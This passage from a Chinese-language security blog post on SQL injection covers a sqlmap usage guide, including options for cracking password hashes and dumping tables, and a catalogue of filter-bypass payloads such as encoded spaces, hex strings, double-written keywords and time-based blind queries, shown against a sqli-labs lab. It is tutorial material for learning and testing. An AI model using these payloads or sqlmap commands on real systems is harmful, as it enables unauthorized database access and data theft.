<h3 id="4、查询数据"><a href="#4、查询数据" class="headerlink" title="4、查询数据"></a>4、查询数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br><span class="line"><span class="keyword">select</span> b,d <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> d <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `security`.users)a</span><br></pre></td></tr></table></figure>

<h1 id="V、SQLMAP"><a href="#V、SQLMAP" class="headerlink" title="V、SQLMAP"></a>V、SQLMAP</h1><p>SQL注入自动化神器</p>
<p><a target="_blank" rel="noopener" href="https://sqlmap.org/">sqlmap: automatic SQL injection and database takeover tool</a></p>
<h2 id="一、基本使用"><a href="#一、基本使用" class="headerlink" title="一、基本使用"></a>一、基本使用</h2><ul>
<li><p><strong>指定目标</strong></p>
<blockquote>
<p>参数： <code>-u [url]</code> 或 <code>--url  [url]</code></p>
</blockquote>
<p>  使用参数 -u 或 –url 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，还可以指定端口，如：</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;www.baidu.com/user.php?id=7&quot;</span></span><br><span class="line">sqlmap.py -url <span class="string">&quot;www.baidu.com:8080/user.php?id=7&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>从文件读取目标</strong></p>
<blockquote>
<p>参数：<code>-m [filename]</code></p>
</blockquote>
<p>  文件中保存url格式如下，sqlmap会一个一个检测</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.target1.com/vuln1.php?q=foobar</span><br><span class="line">www.target2.com/vuln2.asp?id=<span class="number">1</span></span><br><span class="line">www.target3.com/vuln3/id/<span class="number">1</span>*</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>从文件载入 HTTP 请求测试</strong></p>
<blockquote>
<p>使用参数：<code>-r</code></p>
</blockquote>
<p>  可以可以理解抓个包下来，获取 HTTP 请求然后保存在文件里，然后让 SQLMap 自己去解析请求来进行注入测试。</p>
<p>  这样可以避免设置很多的参数，例如POST Cookie等</p>
<p>  可以从 burp suite 上抓包下来配合 SQLMap 进行联合使用。</p>
<p>  使用<code>*</code>标识注入点</p>
<p>  当请求是HTTPS的时候你需要配合这个–force-ssl参数来使用，或者你可以在Host头后面加上:443</p>
</li>
<li><p><strong>指定注入点：</strong>*</p>
<p>  SQLMap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。</p>
<p>  <code>/admin/1/</code> 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样： <code>/admin.php?id=1</code></p>
<p>  它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;www.baidu.com/admin/1*&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>POST 数据</strong></p>
<blockquote>
<p>使用参数：<code>-date</code></p>
</blockquote>
<p>  在 URL 后跟上你要提交的 POST 数据，SQLMap 也会去自动测试。</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://baidu.com/admin.php&quot;</span> --data=<span class="string">&quot;id=1&amp;name=admin&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>cookie</strong></p>
<blockquote>
<p>使用参数：<code>-cookie</code></p>
</blockquote>
<p>  这种方式多半来进行 cookie 的注入检测，设置比较繁琐，也可以直接设置测试等级为 3，会自动测试是否存在 cookie 注入。</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://baidu.com/admin.php&quot;</span> --cookie <span class="string">&quot;customerId=591edabaab5b52292042df8a&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>设定输出等级：</strong></p>
<blockquote>
<p>使用参数：<code>-v  [0-6]</code></p>
</blockquote>
<p>  V 这个命令，在 SQLMap 里可以理解成是一共输出的信息，他的测试等级是非常多的，一共分了七个等级出来，这七个等级在测试的时候会在界面里返回不同的内容。</p>
<p>  默认是 1，也可以在命令后指定 -v 3 就是等级 3 的输出。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0：只显示 Python 的 tracebacks 信息、错误信息 [ERROR] 和关键信息 [CRITICAL]；</span><br><span class="line">1：同时显示普通信息 [INFO] 和警告信息 [WARNING]；</span><br><span class="line">2：同时显示调试信息 [DEBUG]；</span><br><span class="line">3：同时显示注入使用的攻击荷载；</span><br><span class="line">4：同时显示 HTTP 请求；</span><br><span class="line">5：同时显示 HTTP 响应头；</span><br><span class="line">6：同时显示 HTTP 响应体。</span><br></pre></td></tr></table></figure>

<pre><code>推荐使用 3 等级，这样会给出 payload
</code></pre>
<ul>
<li><p><strong>设定扫描级别：</strong></p>
<blockquote>
<p>使用参数：<code>--level [0-6]</code></p>
</blockquote>
<p>  共有五个等级，默认为1，sqlmap使用的payload可以在xml&#x2F;payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</p>
<p>  这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent&#x2F;Referer头在level为3的时候就会测试。</p>
<p>  总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1：</span><br><span class="line">2：HTTP Cookie头注入；</span><br><span class="line">3：HTTP User-Agent/Referer头注入；</span><br><span class="line">4：</span><br><span class="line">5：增加测试到50个字段（默认10）；</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>风险等级：</strong></p>
<blockquote>
<p>参数：<code>--risk</code></p>
</blockquote>
<p>  共有四个风险等级</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1：会测试大部分的测试语句（默认）</span><br><span class="line">2：会增加基于事件的测试语句</span><br><span class="line">3：会增加OR语句的SQL注入测试</span><br><span class="line">4：</span><br></pre></td></tr></table></figure>

<pre><code>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。

测试的语句同样可以在xml/payloads.xml中找到，也可以自行添加payload。
</code></pre>
<ul>
<li><p><strong>注入技术</strong></p>
<blockquote>
<p>参数：<code>--technique</code></p>
</blockquote>
<p>  这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p>
<p>  支持的探测方式如下：</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: <span class="built_in">Error</span>-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入)</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>用户</strong></p>
<blockquote>
<p>参数：<code>--current-user</code></p>
</blockquote>
<p>  在大多数据库中可以获取到管理数据的用户。</p>
</li>
<li><p><strong>当前数据库</strong></p>
<blockquote>
<p>参数：<code>--current-db</code></p>
</blockquote>
<p>  返还当前连接的数据库。</p>
</li>
<li><p><strong>当前用户是否为管理员</strong></p>
<p>  参数：<code>--is-dba</code></p>
<p>  判断当前的用户是否为管理，是的话会返回True。</p>
</li>
<li><p><strong>列数据库管理用户</strong></p>
<blockquote>
<p>参数：<code>--users</code></p>
</blockquote>
<p>  当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p>
</li>
<li><p><strong>列出并破解用户hash</strong></p>
<blockquote>
<p>参数：<code>--passwords</code></p>
</blockquote>
<p>  当前用户有权限读取包含用户密码表的权限时，sqlmap会列举出用户，然后列出hash，并尝试破解。</p>
</li>
<li><p>**列库 ****<code>dbs</code>**</p>
<blockquote>
<p>参数： <code>--dbs</code></p>
</blockquote>
<p>  列出当前数据库系统中的数据库</p>
</li>
<li><p>**列表 ****<code>tables</code>**</p>
<blockquote>
<p>命令是 <code>-D [数据库名] --tables</code></p>
</blockquote>
<p>  列出指定的数据库的表，若是不使用-D参数来指定一个数据库时，sqlmap会列出数据库所有库的所有表。</p>
</li>
<li><p>**列出表中字段 ****<code>columns</code>**</p>
<blockquote>
<p>参数： <code>-D [数据库名] -T [表名] --columns</code></p>
</blockquote>
<p>  当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p>
<p>  如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>
</li>
<li><p><strong>列举数据库系统的架构</strong></p>
<blockquote>
<p>参数：<code>--schema --exclude-sysdbs</code></p>
</blockquote>
<p>  用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。</p>
<p>  加上–exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</p>
</li>
<li><p><strong>获取表中数据个数</strong></p>
<blockquote>
<p>参数：<code>--count</code></p>
</blockquote>
<p>  有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p>
</li>
<li><p><strong>获取整个表的数据</strong></p>
<blockquote>
<p>参数：<code>--dump -C [列名] -T [表名] -D [数据库名]</code></p>
</blockquote>
<p>  如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取这个表的所有内容。</p>
<p>  使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。</p>
</li>
</ul>
<h1 id="VI、注入绕过"><a href="#VI、注入绕过" class="headerlink" title="VI、注入绕过"></a>VI、注入绕过</h1><h3 id="1、绕过空格"><a href="#1、绕过空格" class="headerlink" title="1、绕过空格"></a>1、绕过空格</h3><p><strong>使用URL编码的特殊字符 ：</strong></p>
<p><code>%20</code> ：空格</p>
<p><code>%09</code> ：TAB(水平)</p>
<p><code>%0a</code> ：新建一行</p>
<p><code>%0b</code> ：TAB(垂直)</p>
<p><code>%0c</code> ：新的一页</p>
<p><code>%0d</code> ：return功能</p>
<p><code>%a0</code> ：空格</p>
<p><code>%00</code> ：空</p>
<p><a target="_blank" rel="noopener" href="http://10.211.55.6/sqli-labs/Less-26/">http://10.211.55.6/sqli-labs/Less-26/</a></p>
<blockquote>
<p>?id&#x3D;<code>0&#39;%0bunion%0bselect%0b1,database(),&#39;3</code></p>
</blockquote>
<aside>

<p>💡 在 Windows 下会有无法用特殊字符代替空格的问题，这是 Apache 解析的问题，Linux 下无这个问题。</p>
</aside>

<p><strong>使用注释：</strong><code>/**/</code>  <code>/*!*/</code></p>
<p><strong>使用浮点数：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"># 以上语句等价于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>

<h3 id="2、绕过引号"><a href="#2、绕过引号" class="headerlink" title="2、绕过引号"></a>2、绕过引号</h3><p>一般引号会出现在SQL语句的<code>where</code>子句中</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>使用对应十六进制的字符串进行替换</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">users <span class="operator">=</span> <span class="number">0x7573657273</span></span><br><span class="line">security <span class="operator">=</span> <span class="number">0x7365637572697479</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span></span><br></pre></td></tr></table></figure>

<h3 id="3、绕过逗号"><a href="#3、绕过逗号" class="headerlink" title="3、绕过逗号"></a>3、绕过逗号</h3><p><code>left()</code> <code>substr()</code> 等字符串处理函数中存在<code>,</code></p>
<p><strong>使用 <strong><strong><code>substr()</code></strong></strong> ，</strong><strong><code>mid()</code></strong>** ，及****<code>from to</code>**</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><code>limit</code> 中存在<code>,</code></p>
<p><strong>使用</strong>**<code>offset</code>**<strong>进行绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.users limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.users limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span> </span><br></pre></td></tr></table></figure>

<p><code>union select 1,2,3</code> 等联合查询中多列之间存在<code>,</code></p>
<p><strong>使用</strong>**<code>join</code>**<strong>进行绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">UNION</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">UNION</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)C);</span><br></pre></td></tr></table></figure>

<h3 id="4、绕过等号"><a href="#4、绕过等号" class="headerlink" title="4、绕过等号"></a>4、绕过等号</h3><p><strong>使用</strong><strong><code>like</code><strong><strong>、</strong></strong><code>rlike</code><strong><strong>、</strong></strong><code>regexp</code></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;dumb&#x27;</span></span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">where</span> username rlike <span class="string">&#x27;dumb&#x27;</span></span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">where</span> username regexp <span class="string">&#x27;dumb&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="5、绕过or-and-not-xor"><a href="#5、绕过or-and-not-xor" class="headerlink" title="5、绕过or and not xor"></a>5、绕过<code>or</code> <code>and</code> <code>not</code> <code>xor</code></h3><p><strong>使用等价符号进行绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span><span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span>  <span class="operator">=</span><span class="operator">=</span> <span class="operator">||</span></span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span><span class="operator">=</span> ！</span><br><span class="line">xor <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span><span class="operator">^</span><span class="number">1</span>  # 相同为假，不同为真</span><br></pre></td></tr></table></figure>

<h3 id="6、绕过注释符号"><a href="#6、绕过注释符号" class="headerlink" title="6、绕过注释符号"></a>6、绕过注释符号</h3><p><strong>使用</strong><strong><code>#</code><strong><strong>、 <strong><strong><code>--+</code></strong></strong> 、</strong></strong><code>%23</code></strong>** 、****<code>--</code>****  进行注释**</p>
<p><code>#</code>和<code>--</code>  属于mysql的注释</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users # 这是#号注释</span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="comment">-- 这是-- 注释</span></span><br></pre></td></tr></table></figure>

<p><strong>使用闭合进行绕过</strong></p>
<blockquote>
<p>id&#x3D;1’ union select 1,2,3 || ‘1</p>
</blockquote>
<h3 id="7、绕过关键字"><a href="#7、绕过关键字" class="headerlink" title="7、绕过关键字"></a>7、绕过关键字</h3><p>SQL语句在最终执行之前，过滤其中的关键字</p>
<p><strong>双写关键字</strong></p>
<p>将黑名单中的关键字删除，但仅执行一次</p>
<blockquote>
<p>id&#x3D;1’ un<code>union</code>ion select 1,2,3–+</p>
</blockquote>
<p><strong>大小写混合</strong></p>
<p>在比对黑名单时，未忽略大小写</p>
<blockquote>
<p>id&#x3D;1’ UniON SElEcT 1,2,3–+</p>
</blockquote>
<p><strong>使用相同功能的关键词</strong></p>
<p><code>sleep()</code> &#x3D;&gt; <code>benchmark()</code> # benchmark 执行[参数一]次[参数二]</p>
<blockquote>
<p>?id&#x3D;1’ and if(left(database(),1)&#x3D;’s’,<code>benchmark(99999999,md5(1))</code>,1)–+<br>?id&#x3D;1’ and if(left(database(),1)&#x3D;’s’,<code>sleep(5)</code>,1)–+</p>
</blockquote>
<p><code>left()</code> <code>right()</code> <code>mid()</code> <code>substr()</code> <code>lpad()</code> 等字处理函数</p>
<blockquote>
<p>?id&#x3D;1’ and <code>right</code>(database(),1)&#x3D;’y’–+<br>?id&#x3D;1’ and <code>left</code>(database(),1)&#x3D;’s’–+<br>?id&#x3D;1’ and <code>mid</code>(database(),1,1)&#x3D;’s’–+<br>?id&#x3D;1’ and <code>lpad</code>(database(),1,’z’)&#x3D;’s’–+</p>
</blockquote>
<p><code>into</code>代替<code>order by</code></p>
<blockquote>
<p>?id&#x3D;1’ into @1,@2–+<br>?id&#x3D;1’ into @1,@2,@3–+</p>
</blockquote>
<p><strong>使用其他的注入方法</strong></p>
<p>无列名注入</p>
<hr>
<p>参考资料：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/soldi_er/article/details/116901009">https://blog.csdn.net/soldi_er&#x2F;article&#x2F;details&#x2F;116901009</a></p>
<p><a target="_blank" rel="noopener" href="https://err0r.top/article/mardasctf/">https://err0r.top/article/mardasctf/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.dkkkkk.com/basis/NoColumnInjection/">https://blog.dkkkkk.com/basis/NoColumnInjection/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/165567.html">https://www.freebuf.com/column/165567.html</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">LuoLuo</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://lfsdlfsd-sudo.github.io/2022/08/25/SQL%E6%B3%A8%E5%85%A5/">https://lfsdlfsd-sudo.github.io/2022/08/25/SQL%E6%B3%A8%E5%85%A5/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">LuoLuo</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/08/25/XSS%E6%94%BB%E5%87%BB/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="XSS攻击">
                        
                        <span class="card-title">XSS攻击</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-08-25
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            LuoLuo
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/08/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="信息收集">
                        
                        <span class="card-title">信息收集</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-25
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            LuoLuo
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
